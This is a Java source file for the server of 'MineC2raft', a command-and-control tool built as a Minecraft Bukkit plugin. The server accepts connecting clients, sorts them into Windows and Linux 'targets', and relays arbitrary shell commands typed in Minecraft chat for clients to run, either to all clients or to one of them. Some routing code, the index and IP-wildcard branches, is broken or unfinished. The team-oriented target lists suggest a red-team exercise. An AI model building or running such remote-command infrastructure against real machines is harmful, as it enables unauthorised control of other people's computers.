package com.minec2raft.Server;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Arrays;
import java.util.concurrent.CopyOnWriteArrayList;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitTask;

//TODO: Test Ansible
//TODO: Add Wildcard
//TODO: implement windos and linux selection for command broadcasting


/**@author Austin Hall
 * Main server class that handles communication between multiple clients running the Client class.
 * Utilizes the ClientHandler class, making this class easier to read.
 * Original Server code modified for compatibility with Bukkit API.
 * CHATGPT was used as a LEARNING TOOL in the creation of this software.
 */

public class Server {

    public static final String RED = "§4";
    public static final String GREEN = "§2";
    public static final String YELLOW = "§e";
    public static final String BLUE = "§1";
    public static final String BOLD = "§l";
    public static final String GLITCH = "§k";    
    public static final String RESET = "§f";
    public static final String BRAND_IDENTITY = BOLD + YELLOW + "[MineC2raft]: " + RESET;
    public static final double VERSION_NUM = 1.0;
    public static final int PORT = 1000;
    
    private static ServerSocket serverSocket; //socket of the server duh
    private static BukkitTask connectionThread; // bukkit thread that synchronises actions between this server and minecraft.

    public static final CopyOnWriteArrayList<ClientData> clients = new CopyOnWriteArrayList<>();

    public static final CopyOnWriteArrayList<ClientData> windowsClients = new CopyOnWriteArrayList<>();
    public static final CopyOnWriteArrayList<ClientData> linuxClients = new CopyOnWriteArrayList<>();

    /**
     * Creates a new Server object.
     */
    public Server(){
        try {
            serverSocket = new ServerSocket(PORT);
            System.out.println(BRAND_IDENTITY + "Server Ready.");
        } catch(IOException e) {
            System.out.println(BRAND_IDENTITY + "Creation of server Failed. " + e);
        }
    } 
    
    /**
     * runs all of the code relating to client / server communication, and handles user input for commands.
     * @throws IOException
     */
    public void runServer(JavaPlugin plugin) throws IOException {
        Bukkit.broadcastMessage(BRAND_IDENTITY + GREEN + "Server Created. Listening for clients..." + RESET);
        Runtime.getRuntime().addShutdownHook(new Thread(()-> {
            try {
                serverSocket.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }));

        //schedule bukkit thread to handle communications between server any any clients
         connectionThread = Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            try {
                while(!Thread.currentThread().isInterrupted()) {
                    Socket clientSocket = serverSocket.accept();

                    ClientHandler handler = new ClientHandler(clientSocket);
                    handler.start(); 
                    registerClient(handler);
                    // clients.add(handler);
                   
                    Bukkit.getScheduler().runTaskAsynchronously(plugin, handler);
                    
                }
            } catch (IOException e) {
                Bukkit.broadcastMessage(BRAND_IDENTITY + RED + "Client thread stopped." + RESET);

            } 
        });
        
        Bukkit.broadcastMessage(BRAND_IDENTITY + YELLOW + "Type '/c2help' for a list of commands." + RESET);
    }
    
    /**
     * Sort newly connected clients into their OS
     * @param handler - the ClientHandler to be sorted
     * @return whether or not the client registered
     */
    private static boolean registerClient(ClientHandler handler){
        try {
            ClientData data;
            String temp = handler.waitForBroadcast();
            String temparr[] = temp.split(" ");
          
            if (temparr[temparr.length - 2].contains("windows")) {
                System.out.println("DETECTED WINDOWS");
                data = new ClientData(temparr[temparr.length - 1], "Windows", handler, true);
                windowsClients.add(data);
                clients.add(data);
            } else {
                System.out.println("DETECTED LINUX");
                data = new ClientData(temparr[temparr.length - 1], "Linux", handler, true);
                linuxClients.add(data);
                clients.add(data);
            }
             Bukkit.broadcastMessage(BRAND_IDENTITY + GREEN + "Client found at: " + YELLOW + temparr[temparr.length - 1] + RESET);
             
            return true;
        } catch (Exception e) { 
            Bukkit.broadcastMessage("ERROR: " + e);
        }
        return false;
    }

    /**
     * Method that helps runServer() interpret user commands. 
     * Some special commands have been added for ease of use, and any non-special commands will be 
     * interpreted through the client's terminal.
     * @param cmd - the user input.
     */
    public static String commandHandler( String target, String cmd, CommandSender sender) {
        String reply;
        String returnStr = "";
        switch(cmd) {
            case "os", "version":
                reply = "ver";
                returnStr = broadcast(reply, sender, target);
                break;
            case "user", "client":
                reply = "whoami";
                returnStr = broadcast(reply, sender, target);
                break;
            case "poop":
                for(int i = 1; i <= 100; i++) {
                    Bukkit.broadcastMessage(i + ": Poop");
                }
                break;          
            default: 
                returnStr = broadcast(cmd, sender, target);
                break;  
        }
        return returnStr;
    }

    /** 
     * Broadcasts commands to all clients - if the message does not have "CMD: " 
     * at the start, the client WILL NOT interpret the message.
     * @return the String to return to the minecraft command (so you can see it show up in chat!)
     */
    public static String broadcast(String msg, CommandSender sender, String target) {

        if(msg == null || msg.trim().isEmpty() || msg.equals("__END__\n")) { }

        if(clients.isEmpty()) {
            System.out.println(BRAND_IDENTITY + RED + "No clients connected." + RESET);
        }

        switch(target) {
            case "all":
                for(ClientData client : clients) {
                        client.getHandler().sendMessage("CMD: " + msg);
                    }
                return BRAND_IDENTITY + "All clients recieved command.";
            case "windows":
                for(ClientData client: clients) {
                    if(client.getDetectedOs().equals("windows")) {
                        client.getHandler().sendMessage("CMD: " + msg);
                    }
                }
                return BRAND_IDENTITY + "All windows clients recieved command.";

            case "linux":
                for(ClientData client: clients) {
                    if(client.getDetectedOs().equals("linux")) {
                        client.getHandler().sendMessage("CMD: " + msg);
                    }
                }
                return BRAND_IDENTITY + "All linux clients recieved command.";
            
            case "index":
                try {
                    int destination = Integer.parseInt(target);
                    clients.get(destination).getHandler().sendMessage("CMD: " + msg);
                    try {

                        String result = clients.get(destination).getHandler().waitForBroadcast();
                        if (result.equals("CONNECTION FAILED!\n")) {
                            Bukkit.broadcastMessage( Server.BRAND_IDENTITY + 
                                                     "Connection lost: " + 
                                                     clients.get(destination).getLastKnownIp());
                            clients.remove(destination);
                        }
                        return result;
                    } catch(InterruptedException e) { return BRAND_IDENTITY + "ERROR IN GETTING CLIENTS";}
                } catch(Exception e) { System.out.println("Invalid Target!"); }
                    
            default: // destination is raw ip / wildcard
            String octet[] = target.split(".");
            System.out.println("Octet: " + Arrays.toString(octet));
            for(ClientData data: clients) {
                String targetoctet[] = data.getLastKnownIp().split(":");
                System.out.println("in Octet: " + Arrays.toString(targetoctet));
            }



            }
        return BRAND_IDENTITY + "ERROR BROADCASTING!";
                
    }
    
    /**
     * list currently connected / bound clients
     * @return String of connected clients
     */
    public static String currentConnectedClients() {
        String arr = BRAND_IDENTITY + "\n";
        if(clients.size() == 0) {
            arr += RED + "No connected clients. " + RESET + "\n";
            return arr;
        } else {
            arr += GREEN + "\nCurrent Connected Clients:" + RESET + "\n";
            for(int i = 0; i < clients.size(); i++) {
                arr += YELLOW + i + ": " + RESET + clients.get(i).getLastKnownIp() + " OS: " + clients.get(i).getDetectedOs() + "\n\n";
            }
        
        }
        arr += YELLOW + "linux: " + GREEN + "broadcast to all Linux clients\n" + 
                BLUE + "windows: " + GREEN + "broadcast to all Windows clients" + RESET;
        return arr;
    }

    /**
     * prints out linux and windows targets EVER FOUND on the server
     * @return String of all clients ever connected
     */
    public static String formatArrLstDB() {
        String arr = BRAND_IDENTITY;
        if(clients.size() == 0) {
            arr += BRAND_IDENTITY + RED + "No connected clients. " + RESET + "\n";
            return arr;
        } else {
            arr += BRAND_IDENTITY + GREEN + "\nClients Found:" + RESET + "\n\n";
            arr += "LINUX CLIENTS: \n";
            for(int i = 0; i < linuxClients.size(); i++) {
                 arr += YELLOW + i + ": " + RESET + linuxClients.get(i).getLastKnownIp() + "\n\n";
            }
            arr += "WINDOWS CLIENTS: \n";
            for(int i = 0; i < windowsClients.size(); i++) {
                 arr += YELLOW + i + ": " + RESET + windowsClients.get(i).getLastKnownIp() + "\n";
            }
        }
        arr += YELLOW + "linux:" + GREEN + "broadcast to all linux clients\n" + 
                BLUE + "windows:" + GREEN + "broadcast to all windows clients" + RESET;
        return arr;
    }

    /**
     * prints out linux and windows targets per team
     * @return String of all clients connected per team
     */
    public static String formatArrLstTeams() {
        String arr = BRAND_IDENTITY;
        if(clients.size() == 0) {
            arr += BRAND_IDENTITY + RED + "No connected clients. " + RESET + "\n";
            return arr;
        } else {
            arr += BRAND_IDENTITY + GREEN + "\nClients Found:" + RESET + "\n\n";
            arr += "LINUX CLIENTS: \n";
            for(int i = 0; i < linuxClients.size(); i++) {
                if(linuxClients.size() == 0) {
                    arr += BRAND_IDENTITY + RED + "No Linux Clients!" + RESET;
                    break;
                }
                arr += YELLOW + i + ": " + RESET + linuxClients.get(i).getLastKnownIp() + "\n\n";
            }
            arr += "WINDOWS CLIENTS: \n";
            for(int i = 0; i < windowsClients.size(); i++) {
                if(windowsClients.size() == 0) {
                    arr += BRAND_IDENTITY + RED + "No Windows Clients!" + RESET;
                    break;
                }
                arr += YELLOW + i + ": " + RESET + windowsClients.get(i).getLastKnownIp() + "\n";
            }
        }
        arr += GREEN + "linux: broadcast to all Linux clients\nwindows: broadcast to all Windows clients" + RESET;
        return arr;
    }

    public static void stopServer() {
        try {
            for(ClientData client : clients) {
                client.getHandler().sendMessage("CMD: __CLOSING__");
            }
            serverSocket.close();
            connectionThread.cancel();
            clients.clear();

        } catch(Exception e) {
            System.out.println("Error stopping server: " + e);
        }
        
    }
}
